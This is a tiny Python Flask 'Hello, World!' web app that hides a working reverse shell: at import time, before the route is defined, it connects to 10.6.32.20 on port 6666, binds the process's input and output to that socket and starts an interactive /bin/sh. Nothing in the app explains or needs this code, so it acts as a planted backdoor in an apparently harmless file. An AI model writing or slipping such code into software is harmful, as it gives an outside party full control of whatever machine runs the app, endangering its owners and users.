from flask import Flask
app = Flask(__name__)

import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.6.32.20",6666));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);

@app.route('/')
def hello_world():
    return 'Hello, World!'